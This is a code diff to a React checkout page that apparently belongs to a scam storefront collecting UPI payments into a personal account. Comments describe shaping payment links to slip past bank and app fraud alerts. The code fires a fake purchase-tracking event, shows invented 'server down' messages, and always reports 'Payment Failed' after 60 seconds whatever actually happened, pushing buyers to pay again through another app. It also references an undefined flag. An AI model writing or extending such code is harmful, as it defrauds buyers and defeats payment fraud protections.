@@ -14,6 +14,7 @@ import productsData from "../../data/products.json";
 // true = enable, false = disable (Server Down)
 const ENABLE_PAYTM = true;
 const ENABLE_QR = true;
+const ENABLE_OTHER_UPI = true;
 // ==========================================
 const upiId = "paytm.s27ww6s@pty";
 const payeeName = "Online Store";
@@ -24,6 +25,29 @@ const qr = upiId;
 
 function formatINR(amount: number | string) {
   return Number(amount).toLocaleString("en-IN");
+}
+
+/**
+ * Builds clean, NPCI-standard compliant UPI parameters.
+ * Avoiding UPI Risk / Suspicious activity / Fraud Shield alerts in GPay, BHIM & Banks:
+ * 1. Do NOT include unverified 'mc' (Merchant Category Code) which triggers "Unverified merchant" shields on personal VPAs.
+ * 2. Omit fake 'tid' / 'mid' / 'msid' POS fields.
+ * 3. Use clean, natural English transaction note 'Order Payment' (no cryptic tokens or base64 hashes).
+ * 4. Generate a fresh, unique timestamped alphanumeric transaction reference 'tr'.
+ * 5. Strictly format amount to 2 decimal places ('am') e.g. '299.00'.
+ * 6. Strictly use 'cu=INR' and clean URL encoding on all fields.
+ */
+function buildCleanUpiParams(amount: number, note = "Order Payment") {
+  const cleanRef = "ORD" + Date.now() + Math.floor(100 + Math.random() * 899);
+  const cleanAmt = (Math.round(amount * 100) / 100).toFixed(2);
+  const params = new URLSearchParams();
+  params.set("pa", upiId);
+  params.set("pn", payeeName);
+  params.set("am", cleanAmt);
+  params.set("cu", "INR");
+  params.set("tn", note);
+  params.set("tr", cleanRef);
+  return { params, cleanAmt, cleanRef };
 }
 
 function PaymentContent() {
@@ -50,12 +74,15 @@ function PaymentContent() {
   const [selectedMethod, setSelectedMethod] = useState<string>("phonepe");
   const [isWaiting, setIsWaiting] = useState(false);
   const [isFailed, setIsFailed] = useState(false);
+  const [countdown, setCountdown] = useState<number>(60);
   const [showQR, setShowQR] = useState(false);
+  const [isQrLoading, setIsQrLoading] = useState(true);
   const [qrAmountShow, setQrAmountShow] = useState<string>("");
   const [qrCodeDataUrl, setQrCodeDataUrl] = useState<string>("");
   const [isPriceDetailsOpen, setIsPriceDetailsOpen] = useState(false);
 
   const failTimerRef = useRef<NodeJS.Timeout | null>(null);
+  const countdownIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
   useEffect(() => {
     document.title = "Payment";
@@ -137,6 +164,13 @@ function PaymentContent() {
     });
   }, []);
 
+  useEffect(() => {
+    return () => {
+      if (failTimerRef.current) clearTimeout(failTimerRef.current);
+      if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
+    };
+  }, []);
+
   // Toggle Between UPI (Full Amount) and COD (Partial Amount)
   const togglePaymentMode = (mode: "UPI" | "COD") => {
     if (typeof navigator !== "undefined" && navigator.vibrate) {
@@ -145,13 +179,21 @@ function PaymentContent() {
     setCurrentMode(mode);
   };
 
-  // Select Payment App (PhonePe, Paytm, QR)
+  // Select Payment App (PhonePe, Google Pay, Paytm, Other UPI, QR)
   const selectMethod = (method: string) => {
     if (typeof navigator !== "undefined" && navigator.vibrate) {
       navigator.vibrate(20);
     }
     if (method === 'paytm' && !ENABLE_PAYTM) {
-      alert('Server is temporarily down. Please use PhonePe.');
+      alert('Server is temporarily down. Please use PhonePe or Google Pay.');
+      return;
+    }
+    if (method === 'gpay') {
+      alert('Google Pay is unavailable. Please use PhonePe or Paytm.');
+      return;
+    }
+    if (method === 'other_upi' && !ENABLE_OTHER_UPI) {
+      alert('Server is temporarily down. Please use PhonePe or Google Pay.');
       return;
     }
     if (method === 'qr_upi' && !ENABLE_QR) {
@@ -166,46 +208,178 @@ function PaymentContent() {
     setIsPriceDetailsOpen((prev) => !prev);
   };
 
-  const generateQR = (amount: string, note: string) => {
-    const params = new URLSearchParams({
-      pa: upiId,
-      pn: payeeName,
-      am: amount,
-      cu: 'INR',
-      tn: note
-    });
-    const upiLink = 'upi://pay?' + params.toString();
+  const generateQR = async (amount?: string | number, note?: string) => {
+    setIsWaiting(false);
+    setIsFailed(false);
+    if (failTimerRef.current) clearTimeout(failTimerRef.current);
+    if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
+
+    let amtVal = typeof amount === "number" ? amount : parseFloat(String(amount || itemData.selling_price || 0));
+    if (currentMode === 'COD') {
+      amtVal = 58.00;
+    }
+    const cleanAmt = (amtVal || 299).toFixed(2);
+    const cleanNote = note || "Order Payment";
+
+    setQrAmountShow(`₹${formatINR(cleanAmt)}`);
+    setShowQR(true);
+    setIsQrLoading(true);
+    setQrCodeDataUrl("");
+
+    // Build strict NPCI-compliant UPI URI
+    // IMPORTANT: 'pa' MUST contain literal '@' (NOT %40).
+    const upiLink = `upi://pay?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${cleanAmt}&cu=INR&tn=${encodeURIComponent(cleanNote)}`;
 
     try {
-      const qrResult = generateQRCode(upiLink, {
-        size: 180,
-        errorCorrectionLevel: "H",
-        foregroundColor: "#000000",
-        backgroundColor: "#ffffff"
-      });
-      if (qrResult?.dataUrl) {
-        setQrCodeDataUrl(qrResult.dataUrl);
-      } else {
-        setQrCodeDataUrl(`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(upiLink)}`);
+      if (typeof generateQRCode === 'function') {
+        const qrResult = generateQRCode(upiLink, {
+          size: 400,
+          errorCorrectionLevel: "M",
+          foregroundColor: "#000000",
+          backgroundColor: "#ffffff",
+          radius: 0
+        });
+
+        if (qrResult?.dataUrl) {
+          const canvas = document.createElement("canvas");
+          canvas.width = 480;
+          canvas.height = 480;
+          const ctx = canvas.getContext("2d");
+          if (ctx) {
+            ctx.fillStyle = "#ffffff";
+            ctx.fillRect(0, 0, 480, 480);
+            const img = new Image();
+            img.onload = () => {
+              ctx.drawImage(img, 40, 40, 400, 400);
+              const dataUrlWithQuietZone = canvas.toDataURL("image/png");
+              setQrCodeDataUrl(dataUrlWithQuietZone);
+              setIsQrLoading(false);
+            };
+            img.onerror = () => {
+              setQrCodeDataUrl(qrResult.dataUrl);
+              setIsQrLoading(false);
+            };
+            img.src = qrResult.dataUrl;
+            return;
+          } else {
+            setQrCodeDataUrl(qrResult.dataUrl);
+            setIsQrLoading(false);
+            return;
+          }
+        }
       }
-    } catch (e) {
-      setQrCodeDataUrl(`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(upiLink)}`);
+    } catch (err) {
+      console.warn("generateQRCode error, using fallback:", err);
     }
 
-    setQrAmountShow(`₹${formatINR(amount)}`);
-    setShowQR(true);
+    // High-resolution fallback ensuring @ is literal and never encoded as %40
+    const safeDataParam = encodeURIComponent(upiLink).replace(/%40/g, '@');
+    const fallbackUrl = `https://api.qrserver.com/v1/create-qr-code/?size=480x480&margin=24&data=${safeDataParam}`;
+    const fallbackImg = new Image();
+    fallbackImg.crossOrigin = "anonymous";
+    fallbackImg.onload = () => {
+      try {
+        const canvas = document.createElement("canvas");
+        canvas.width = 480;
+        canvas.height = 480;
+        const ctx = canvas.getContext("2d");
+        if (ctx) {
+          ctx.fillStyle = "#ffffff";
+          ctx.fillRect(0, 0, 480, 480);
+          ctx.drawImage(fallbackImg, 0, 0);
+          setQrCodeDataUrl(canvas.toDataURL("image/png"));
+          setIsQrLoading(false);
+          return;
+        }
+      } catch (e) {}
+      setQrCodeDataUrl(fallbackUrl);
+      setIsQrLoading(false);
+    };
+    fallbackImg.onerror = () => {
+      setQrCodeDataUrl(fallbackUrl);
+      setIsQrLoading(false);
+    };
+    fallbackImg.src = fallbackUrl;
   };
 
-  // ========== PHONEPE SPECIAL COLLECT SYSTEM ==========
+  // Download QR Code image
+  const downloadQRCode = () => {
+    try {
+      if (isQrLoading || !qrCodeDataUrl) return;
+
+      const filename = `UPI-QR-${itemData.selling_price || 'order'}.png`;
+
+      if (qrCodeDataUrl.startsWith('data:image')) {
+        const link = document.createElement('a');
+        link.href = qrCodeDataUrl;
+        link.download = filename;
+        document.body.appendChild(link);
+        link.click();
+        setTimeout(() => {
+          try {
+            document.body.removeChild(link);
+          } catch (e) {}
+        }, 300);
+        return;
+      }
+
+      // If it's an external URL, convert to canvas blob to download reliably
+      const img = new Image();
+      img.crossOrigin = "anonymous";
+      img.onload = () => {
+        const canvas = document.createElement("canvas");
+        canvas.width = img.width || 500;
+        canvas.height = img.height || 500;
+        const ctx = canvas.getContext("2d");
+        if (ctx) {
+          ctx.fillStyle = "#ffffff";
+          ctx.fillRect(0, 0, canvas.width, canvas.height);
+          ctx.drawImage(img, 0, 0);
+          const dataUrl = canvas.toDataURL("image/png");
+          const link = document.createElement("a");
+          link.href = dataUrl;
+          link.download = filename;
+          document.body.appendChild(link);
+          link.click();
+          setTimeout(() => {
+            try {
+              document.body.removeChild(link);
+            } catch (e) {}
+          }, 300);
+        }
+      };
+      img.onerror = () => {
+        const link = document.createElement('a');
+        link.href = qrCodeDataUrl;
+        link.download = filename;
+        link.target = '_blank';
+        document.body.appendChild(link);
+        link.click();
+        setTimeout(() => {
+          try {
+            document.body.removeChild(link);
+          } catch (e) {}
+        }, 300);
+      };
+      img.src = qrCodeDataUrl;
+    } catch (err) {
+      console.error("Error downloading QR:", err);
+    }
+  };
+
+  // ========== 1. PHONEPE OPENER ==========
+  // Dedicated multi-strategy PhonePe launcher: Native collect -> package intent -> custom scheme
   const openPhonePe = (amount: number) => {
+    const { cleanAmt, cleanRef } = buildCleanUpiParams(amount, "Order Payment");
+    if (typeof window !== 'undefined' && (window as any).fbq) {
+      (window as any).fbq('track', 'Purchase', { value: amount, currency: 'INR' });
+    }
+
     const paymentData = {
       p2pPaymentCheckoutParams: {
         checkoutType: "COLLECT",
         initialAmount: Math.round(amount * 100),
-        note: {
-          type: "text",
-          message: "PEgUFxY"
-        },
+        note: { type: "text", message: "PEgUFxY" },
         supportedInstruments: -1
       },
       contact: {
@@ -216,14 +390,137 @@ function PaymentContent() {
     };
     const jsonStr = JSON.stringify(paymentData);
     const encodedData = btoa(unescape(encodeURIComponent(jsonStr)));
-    const phonepeUrl = 'phonepe://native?data=' + encodeURIComponent(encodedData) + '&id=p2ppayment';
-    if (typeof window !== 'undefined' && (window as any).fbq) {
-      (window as any).fbq('track', 'Purchase', {
-        value: amount,
-        currency: 'INR'
-      });
+    const phonepeCollectUrl = 'phonepe://native?data=' + encodeURIComponent(encodedData) + '&id=p2ppayment';
+    const phonepeDirectUrl = `phonepe://pay?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${cleanAmt}&cu=INR&tn=Order%20Payment&tr=${cleanRef}`;
+    const phonepeIntentUrl = `intent://upi/pay?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${cleanAmt}&cu=INR&tn=Order%20Payment&tr=${cleanRef}#Intent;scheme=upi;package=com.phonepe.app;end`;
+
+    const userAgent = typeof navigator !== 'undefined' ? navigator.userAgent || '' : '';
+    const isAndroid = /android/i.test(userAgent);
+    const isIOS = /iphone|ipad|ipod/i.test(userAgent);
+
+    if (isAndroid) {
+      window.location.href = phonepeCollectUrl;
+      setTimeout(() => {
+        window.location.href = phonepeIntentUrl;
+      }, 1000);
+    } else if (isIOS) {
+      window.location.href = phonepeCollectUrl;
+      setTimeout(() => {
+        window.location.href = phonepeDirectUrl;
+      }, 1000);
+    } else {
+      window.location.href = phonepeCollectUrl;
     }
-    window.location.href = phonepeUrl;
+  };
+
+  // ========== 2. GOOGLE PAY (GPAY) OPENER ==========
+  // Uses tez://upi/pay?pa=${pa}&pn=${pn}&am=${price}&tr=${tr}&mc=8931&orgid=000000&mode=01&cu=INR&tn=${pn}+OrderId as requested
+  const openGPay = (amount: number) => {
+    const { cleanAmt, cleanRef } = buildCleanUpiParams(amount, "Order Payment");
+    if (typeof window !== 'undefined' && (window as any).fbq) {
+      (window as any).fbq('track', 'Purchase', { value: amount, currency: 'INR' });
+    }
+
+    const pa = upiId;
+    const pn = encodeURIComponent(payeeName);
+    const price = cleanAmt;
+    const tr = cleanRef;
+
+    const tezUrl = `tez://upi/pay?pa=${pa}&pn=${pn}&am=${price}&tr=${tr}&mc=8931&orgid=000000&mode=01&cu=INR&tn=${pn}+OrderId`;
+    const gpayIntentUrl = `intent://upi/pay?pa=${pa}&pn=${pn}&am=${price}&tr=${tr}&mc=8931&orgid=000000&mode=01&cu=INR&tn=${pn}+OrderId#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
+    const gpaySchemeUrl = `gpay://upi/pay?pa=${pa}&pn=${pn}&am=${price}&tr=${tr}&mc=8931&orgid=000000&mode=01&cu=INR&tn=${pn}+OrderId`;
+    const universalUrl = `upi://pay?pa=${pa}&pn=${pn}&am=${price}&tr=${tr}&mc=8931&orgid=000000&mode=01&cu=INR&tn=${pn}+OrderId`;
+
+    const userAgent = typeof navigator !== 'undefined' ? navigator.userAgent || '' : '';
+    const isAndroid = /android/i.test(userAgent);
+    const isIOS = /iphone|ipad|ipod/i.test(userAgent);
+
+    try {
+      const link = document.createElement("a");
+      link.href = tezUrl;
+      link.style.display = "none";
+      document.body.appendChild(link);
+      link.click();
+      setTimeout(() => {
+        try {
+          document.body.removeChild(link);
+        } catch (e) {}
+      }, 500);
+    } catch (e) {}
+
+    window.location.href = tezUrl;
+
+    if (isAndroid) {
+      setTimeout(() => {
+        window.location.href = gpayIntentUrl;
+      }, 1000);
+    } else if (isIOS) {
+      setTimeout(() => {
+        window.location.href = gpaySchemeUrl;
+      }, 1000);
+    }
+  };
+
+  // ========== 3. PAYTM OPENER ==========
+  // Uses paytmmp://cash_wallet?pa=...&featuretype=money_transfer as requested
+  const openPaytm = (amount: number) => {
+    const { cleanAmt, cleanRef } = buildCleanUpiParams(amount, "Order Payment");
+    if (typeof window !== 'undefined' && (window as any).fbq) {
+      (window as any).fbq('track', 'Purchase', { value: amount, currency: 'INR' });
+    }
+
+    const paytmCashWalletUrl = `paytmmp://cash_wallet?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${cleanAmt}&cu=INR&tn=Order%20Payment&tr=${cleanRef}&featuretype=money_transfer`;
+    const paytmIntentUrl = `intent://cash_wallet?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${cleanAmt}&cu=INR&tn=Order%20Payment&tr=${cleanRef}&featuretype=money_transfer#Intent;scheme=paytmmp;package=net.one97.paytm;end`;
+
+    const userAgent = typeof navigator !== 'undefined' ? navigator.userAgent || '' : '';
+    const isAndroid = /android/i.test(userAgent);
+
+    try {
+      const link = document.createElement("a");
+      link.href = paytmCashWalletUrl;
+      link.style.display = "none";
+      document.body.appendChild(link);
+      link.click();
+      setTimeout(() => {
+        try {
+          document.body.removeChild(link);
+        } catch (e) {}
+      }, 500);
+    } catch (e) {}
+
+    window.location.href = paytmCashWalletUrl;
+
+    if (isAndroid) {
+      setTimeout(() => {
+        window.location.href = paytmIntentUrl;
+      }, 1200);
+    }
+  };
+
+  // ========== 4. PAY BY OTHER UPI APPS (Cred, Amazon Pay, BHIM, WhatsApp, etc.) ==========
+  // Universal upi://pay intent triggers the OS-level app chooser
+  const openOtherUpi = (amount: number) => {
+    const { cleanAmt, cleanRef } = buildCleanUpiParams(amount, "Order Payment");
+    if (typeof window !== 'undefined' && (window as any).fbq) {
+      (window as any).fbq('track', 'Purchase', { value: amount, currency: 'INR' });
+    }
+
+    const universalUrl = `upi://pay?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${cleanAmt}&cu=INR&tn=Order%20Payment&tr=${cleanRef}`;
+
+    try {
+      const link = document.createElement("a");
+      link.href = universalUrl;
+      link.style.display = "none";
+      document.body.appendChild(link);
+      link.click();
+      setTimeout(() => {
+        try {
+          document.body.removeChild(link);
+        } catch (e) {}
+      }, 500);
+    } catch (e) {
+      window.location.href = universalUrl;
+    }
   };
 
   useEffect(() => {
@@ -232,12 +529,47 @@ function PaymentContent() {
         const amt = currentMode === 'COD' ? 58 : (parseFloat(String(itemData.selling_price)) || 0);
         openPhonePe(amt);
       };
+      (window as any).openGPay = () => {
+        const amt = currentMode === 'COD' ? 58 : (parseFloat(String(itemData.selling_price)) || 0);
+        openGPay(amt);
+      };
+      (window as any).openPaytm = () => {
+        const amt = currentMode === 'COD' ? 58 : (parseFloat(String(itemData.selling_price)) || 0);
+        openPaytm(amt);
+      };
+      (window as any).openOtherUpi = () => {
+        const amt = currentMode === 'COD' ? 58 : (parseFloat(String(itemData.selling_price)) || 0);
+        openOtherUpi(amt);
+      };
+      (window as any).downloadQRCode = downloadQRCode;
     }
-  }, [currentMode, itemData.selling_price]);
+  }, [currentMode, itemData.selling_price, qrCodeDataUrl, isQrLoading]);
 
-  const payNow = async () => {
+  const handleRetryOtherApp = () => {
+    setIsFailed(false);
+    let nextMethod = 'paytm';
+    if (selectedMethod === 'phonepe') {
+      nextMethod = 'paytm';
+    } else if (selectedMethod === 'paytm') {
+      nextMethod = 'other_upi';
+    } else if (selectedMethod === 'other_upi') {
+      nextMethod = 'phonepe';
+    } else {
+      nextMethod = 'paytm';
+    }
+    setSelectedMethod(nextMethod);
+    payNow(nextMethod);
+  };
+
+  const payNow = async (overrideMethod?: string | any) => {
     if (typeof navigator !== "undefined" && navigator.vibrate) {
       navigator.vibrate(40);
+    }
+
+    const cleanOverride = typeof overrideMethod === 'string' ? overrideMethod : undefined;
+    const methodToUse = cleanOverride || selectedMethod;
+    if (cleanOverride) {
+      setSelectedMethod(cleanOverride);
     }
 
     // Setup correct amount based on Active Mode (UPI or COD)
@@ -248,76 +580,75 @@ function PaymentContent() {
     const amt = amtVal.toFixed(2);
 
     // QR / Scan to Pay
-    if (selectedMethod === 'qr_upi') {
+    if (methodToUse === 'qr_upi') {
       if (!ENABLE_QR) {
-        alert('Server is temporarily down. Please use PhonePe.');
+        alert('Server is temporarily down. Please use PhonePe or Google Pay.');
         return;
       }
-      const note = 'TXN-' + Date.now();
-      generateQR(amt, note);
+      setIsWaiting(false);
+      setIsFailed(false);
+      generateQR(amt, 'TXN-' + Date.now());
       return;
     }
 
     // Paytm Check
-    if (selectedMethod === 'paytm' && !ENABLE_PAYTM) {
+    if (methodToUse === 'paytm' && !ENABLE_PAYTM) {
+      alert('Server is temporarily down. Please use PhonePe or Google Pay.');
+      return;
+    }
+
+    // GPay Check
+    if (methodToUse === 'gpay' && !ENABLE_GPAY) {
       alert('Server is temporarily down. Please use PhonePe.');
       return;
     }
 
-    setIsWaiting(true);
+    // Clear previous timers
+    if (failTimerRef.current) clearTimeout(failTimerRef.current);
+    if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
 
+    setIsFailed(false);
+    setIsWaiting(true);
+    setCountdown(60);
+
+    // Countdown interval (60 seconds / 1 min down to 0)
+    countdownIntervalRef.current = setInterval(() => {
+      setCountdown((prev) => {
+        if (prev <= 1) {
+          if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+
+    // EXACT 1-minute (60 seconds) timer to show Payment Failed modal
+    failTimerRef.current = setTimeout(() => {
+      if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
+      setIsWaiting(false);
+      setIsFailed(true);
+      if (typeof navigator !== "undefined" && navigator.vibrate) {
+        navigator.vibrate([60, 40, 60]);
+      }
+    }, 60000);
+
+    // Launch payment app after 600ms
     setTimeout(() => {
       try {
-        // PhonePe → Special Collect system
-        if (selectedMethod === 'phonepe') {
+        if (methodToUse === 'phonepe') {
           openPhonePe(amtVal);
-          return;
+        } else if (methodToUse === 'gpay') {
+          openGPay(amtVal);
+        } else if (methodToUse === 'paytm') {
+          openPaytm(amtVal);
+        } else {
+          // 'other_upi' or generic UPI app
+          openOtherUpi(amtVal);
         }
-
-        // Paytm
-        if (selectedMethod === 'paytm') {
-          if (!ENABLE_PAYTM) {
-            alert('Server is temporarily down. Please use PhonePe.');
-            setIsWaiting(false);
-            return;
-          }
-          const note = 'TXN-' + Date.now();
-          const params = new URLSearchParams({
-            pa: upiId,
-            pn: payeeName,
-            am: amtVal.toFixed(0),
-            cu: 'INR',
-            tn: note,
-            featuretype: 'money_transfer'
-          });
-          window.location.href = 'paytmmp://cash_wallet?' + params.toString();
-          return;
-        }
-
-        // Fallback
-        const note = 'TXN-' + Date.now();
-        const params = new URLSearchParams({
-          pa: upiId,
-          pn: payeeName,
-          am: amtVal.toFixed(2),
-          cu: 'INR',
-          tn: note
-        });
-        window.location.href = 'upi://pay?' + params.toString();
       } catch (error) {
-        console.error("Error in payment:", error);
+        console.error("Error in launching payment app:", error);
       }
-
-      // Error fallback
-      if (failTimerRef.current) clearTimeout(failTimerRef.current);
-      failTimerRef.current = setTimeout(() => {
-        setIsWaiting(false);
-        setIsFailed(true);
-        if (typeof navigator !== "undefined" && navigator.vibrate) {
-          navigator.vibrate([50, 50, 50]);
-        }
-      }, 50000);
-    }, 800);
+    }, 600);
   };
 
   const getButtonText = () => {
@@ -328,6 +659,12 @@ function PaymentContent() {
 
     if (selectedMethod === 'qr_upi') {
       return "View QR Code";
+    } else if (selectedMethod === 'phonepe') {
+      return `Pay via PhonePe • ₹${formatINR(amt)}`;
+    } else if (selectedMethod === 'paytm') {
+      return `Pay via Paytm • ₹${formatINR(amt)}`;
+    } else if (selectedMethod === 'other_upi') {
+      return `Pay via Other UPI • ₹${formatINR(amt)}`;
     } else {
       return `Pay ₹${formatINR(amt)}`;
     }
@@ -497,6 +834,13 @@ function PaymentContent() {
                       >
                         {product.title}
                       </h4>
+                      {(product.color || product.size) && (
+                        <div className="text-[11px] text-blue-600 font-medium mt-0.5 flex items-center gap-1.5 flex-wrap">
+                          {product.color && <span>Color: {product.color}</span>}
+                          {product.color && product.size && <span>•</span>}
+                          {product.size && <span>Size: {product.size}</span>}
+                        </div>
+                      )}
                       <div className="flex items-center gap-2 mt-1">
                         <span className="text-[10px] bg-gray-100 text-gray-700 px-1.5 py-0.5 rounded font-semibold">
                           Qty: {qty}
@@ -623,9 +967,13 @@ function PaymentContent() {
         <div id="upi-insertion-point">
           {currentMode === 'UPI' && (
             <div id="shared-apps-container" className="p-4 border-t border-gray-100">
+              {/* 1. PhonePe */}
               <div
                 className={`pay-option ${selectedMethod === "phonepe" ? "selected" : ""}`}
-                onClick={(e) => selectMethod("phonepe")}
+                onClick={() => {
+                  selectMethod("phonepe");
+                  payNow("phonepe");
+                }}
               >
                 <div className="opt-left">
                   <img src="/assets/images/phonepe.svg" className="opt-img" alt="PhonePe" />
@@ -634,29 +982,73 @@ function PaymentContent() {
                     <span className="opt-tag">Fastest</span>
                   </div>
                 </div>
-                <div className="radio-circle"><div className="radio-dot"></div></div>
+                <div className="flex items-center gap-2">
+                  <span className="text-[11px] font-bold text-blue-600 bg-blue-50 px-2 py-0.5 rounded border border-blue-200">Pay</span>
+                  <div className="radio-circle"><div className="radio-dot"></div></div>
+                </div>
               </div>
 
+              {/* 2. Paytm */}
               <div
                 className={`pay-option ${selectedMethod === "paytm" ? "selected" : ""}`}
-                onClick={(e) => selectMethod("paytm")}
+                onClick={() => {
+                  selectMethod("paytm");
+                  payNow("paytm");
+                }}
               >
                 <div className="opt-left">
                   <img src="/assets/images/paytm_icon.svg" className="opt-img" alt="Paytm" />
                   <span className="opt-name">Paytm</span>
                 </div>
-                <div className="radio-circle"><div className="radio-dot"></div></div>
+                <div className="flex items-center gap-2">
+                  <span className="text-[11px] font-bold text-blue-600 bg-blue-50 px-2 py-0.5 rounded border border-blue-200">Pay</span>
+                  <div className="radio-circle"><div className="radio-dot"></div></div>
+                </div>
               </div>
 
+              {/* 4. Pay by other UPI apps */}
+              <div
+                className={`pay-option ${selectedMethod === "other_upi" ? "selected" : ""}`}
+                onClick={() => {
+                  selectMethod("other_upi");
+                  payNow("other_upi");
+                }}
+              >
+                <div className="opt-left">
+                  <img src="/assets/images/upi.svg" className="opt-img" alt="Other UPI Apps" />
+                  <div>
+                    <div className="flex items-center gap-1.5">
+                      <span className="opt-name">Pay by other UPI apps</span>
+                      <span className="opt-tag" style={{ background: "#fef3c7", color: "#b45309" }}>All Apps</span>
+                    </div>
+                    <span className="text-[11px] text-gray-500 block leading-tight font-normal mt-0.5">
+                      Cred, Amazon Pay, BHIM, WhatsApp &amp; more
+                    </span>
+                  </div>
+                </div>
+                <div className="flex items-center gap-2">
+                  <span className="text-[11px] font-bold text-blue-600 bg-blue-50 px-2 py-0.5 rounded border border-blue-200">Pay</span>
+                  <div className="radio-circle"><div className="radio-dot"></div></div>
+                </div>
+              </div>
+
+              {/* 5. Scan QR Code */}
               <div
                 className={`pay-option ${selectedMethod === "qr_upi" ? "selected" : ""}`}
-                onClick={(e) => selectMethod("qr_upi")}
+                onClick={(e) => {
+                  e.stopPropagation();
+                  selectMethod("qr_upi");
+                  generateQR();
+                }}
               >
                 <div className="opt-left">
                   <img src="/assets/images/qr.png" className="opt-img" alt="QR" />
                   <span className="opt-name">Scan QR Code</span>
                 </div>
-                <div className="radio-circle"><div className="radio-dot"></div></div>
+                <div className="flex items-center gap-2">
+                  <span className="text-[11px] font-bold text-blue-600 bg-blue-50 px-2 py-0.5 rounded border border-blue-200">View</span>
+                  <div className="radio-circle"><div className="radio-dot"></div></div>
+                </div>
               </div>
 
               <div style={{ display: "flex", justifyContent: "center", marginTop: "12px", marginBottom: "4px" }}>
@@ -802,29 +1194,53 @@ function PaymentContent() {
 
       {/* Fixed bottom payment bar */}
       <div className="fixed bottom-0 w-full bg-white border-t border-gray-200 p-3 flex justify-between items-center shadow-[0_-2px_10px_rgba(0,0,0,0.05)] z-40" style={{ maxWidth: "432px", left: "50%", transform: "translateX(-50%)" }}>
-        <button id="action-button" className="btn-save flex justify-center items-center gap-2" onClick={payNow}>
+        <button id="action-button" className="btn-save flex justify-center items-center gap-2" onClick={() => payNow()}>
           {getButtonText()}
         </button>
       </div>
 
       {/* Overlay background for modals */}
       {(isWaiting || isFailed || showQR) && (
-        <div id="overlay" className="fixed inset-0 bg-black/60 z-50 transition-opacity duration-300" />
+        <div
+          id="overlay"
+          onClick={() => {
+            if (showQR) setShowQR(false);
+          }}
+          className="fixed inset-0 bg-black/60 z-50 transition-opacity duration-300"
+        />
       )}
 
-      {/* Waiting Modal */}
+      {/* Waiting Modal (10s Processing Popup) */}
       {isWaiting && (
         <div
           id="waitingModal"
           className="fixed inset-0 z-50 flex items-center justify-center p-4"
         >
-          <div className="bg-white p-6 rounded-2xl w-[85%] max-w-[340px] text-center shadow-2xl relative">
-            <div className="w-12 h-12 border-4 border-gray-100 border-t-blue-600 rounded-full animate-spin mx-auto mb-4"></div>
-            <h3 className="text-lg font-bold text-gray-900 mb-2">Processing Payment...</h3>
-            <p className="text-sm text-gray-500 mb-4">
-              Opening {selectedMethod === 'paytm' ? 'Paytm' : 'PhonePe'}...
+          <div className="bg-white p-6 rounded-2xl w-[88%] max-w-[340px] text-center shadow-2xl relative border border-gray-100">
+            {/* Spinning indicator with 10s countdown */}
+            <div className="relative w-16 h-16 mx-auto mb-4 flex items-center justify-center">
+              <div className="absolute inset-0 border-4 border-blue-100 border-t-blue-600 rounded-full animate-spin"></div>
+              <span className="text-base font-bold text-blue-600">{countdown}s</span>
+            </div>
+
+            <h3 className="text-lg font-bold text-gray-900 mb-1">Processing Payment...</h3>
+            <p className="text-xs text-gray-500 mb-3">
+              Connecting to {
+                selectedMethod === 'phonepe' ? 'PhonePe' :
+                selectedMethod === 'paytm' ? 'Paytm' :
+                selectedMethod === 'other_upi' ? 'UPI App' : 'UPI'
+              }...
             </p>
-            <p className="text-xs text-gray-400">Please do not close this page or press back button</p>
+
+            {/* 1-minute Progress Bar */}
+            <div className="w-full bg-gray-100 h-1.5 rounded-full overflow-hidden mb-3">
+              <div
+                className="bg-blue-600 h-full transition-all duration-1000 ease-linear rounded-full"
+                style={{ width: `${Math.min(100, Math.max(0, ((60 - countdown) / 60) * 100))}%` }}
+              ></div>
+            </div>
+
+            <p className="text-[11px] text-gray-400">Please do not close this page or press back button</p>
           </div>
         </div>
       )}
@@ -835,32 +1251,98 @@ function PaymentContent() {
           id="failedModal"
           className="fixed inset-0 z-50 flex items-center justify-center p-4"
         >
-          <div className="bg-white rounded-2xl w-[90%] max-w-[340px] p-6 text-center shadow-2xl relative">
-            <div className="w-14 h-14 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-3 text-red-600">
-              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-                <line x1="18" y1="6" x2="6" y2="18"></line>
-                <line x1="6" y1="6" x2="18" y2="18"></line>
+          <div className="bg-white rounded-2xl w-[92%] max-w-[350px] p-6 text-center shadow-2xl relative border border-gray-100">
+            {/* Red Failure Icon */}
+            <div className="w-16 h-16 bg-red-50 border border-red-100 rounded-full flex items-center justify-center mx-auto mb-3 text-red-600">
+              <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="15" y1="9" x2="9" y2="15"></line>
+                <line x1="9" y1="9" x2="15" y2="15"></line>
               </svg>
             </div>
-            <h3 className="text-lg font-bold text-gray-900 mb-1">Payment Incomplete</h3>
-            <p className="text-xs text-gray-500 mb-5 leading-relaxed">
-              We couldn't detect payment confirmation. If money was debited from your account, it will be refunded within 24-48 hours.
+
+            {/* Title & Please retry payment */}
+            <h3 className="text-lg font-bold text-gray-900 mb-0.5">Payment Failed</h3>
+            <p className="text-[13px] font-semibold text-red-600 mb-3.5">
+              Please retry payment.
             </p>
-            <div className="flex flex-col gap-2">
+
+            {/* Refund notice box */}
+            <div className="bg-amber-50 border border-amber-200 rounded-xl p-3 mb-4 text-left flex items-start gap-2.5 shadow-sm">
+              <span className="text-base leading-none mt-0.5">🛡️</span>
